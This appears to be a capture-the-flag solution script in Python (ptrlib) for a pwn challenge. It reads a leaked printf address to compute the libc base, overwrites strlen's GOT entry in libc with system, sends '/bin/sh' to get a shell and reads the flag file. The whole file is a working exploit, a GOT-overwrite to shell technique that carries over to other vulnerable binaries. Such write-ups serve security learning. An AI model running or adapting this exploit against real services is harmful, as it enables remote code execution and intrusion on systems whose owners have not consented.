from ptrlib import *
import os

HOST = os.getenv('HOST', 'localhost')
PORT = os.getenv('PORT', '9999')

libc = ELF("./distfiles/libc-2.31.so")
sock = Socket(HOST, int(PORT))

# Receive libc base
libc_base = int(sock.recvlineafter("<printf> = "), 16) - libc.symbol('printf')
logger.info("libc = " + hex(libc_base))
libc.set_base(libc_base)

# GOT overwrite
got_strlen = libc_base + 0x1eb0a8 # __strlen_avx2@got
sock.sendlineafter("address: ", hex(got_strlen))
sock.sendlineafter("value: ", hex(libc.symbol('system')))
sock.sendlineafter("data: ", "/bin/sh")

sock.sendline("cat flag*")
print(sock.recvuntil("}"))
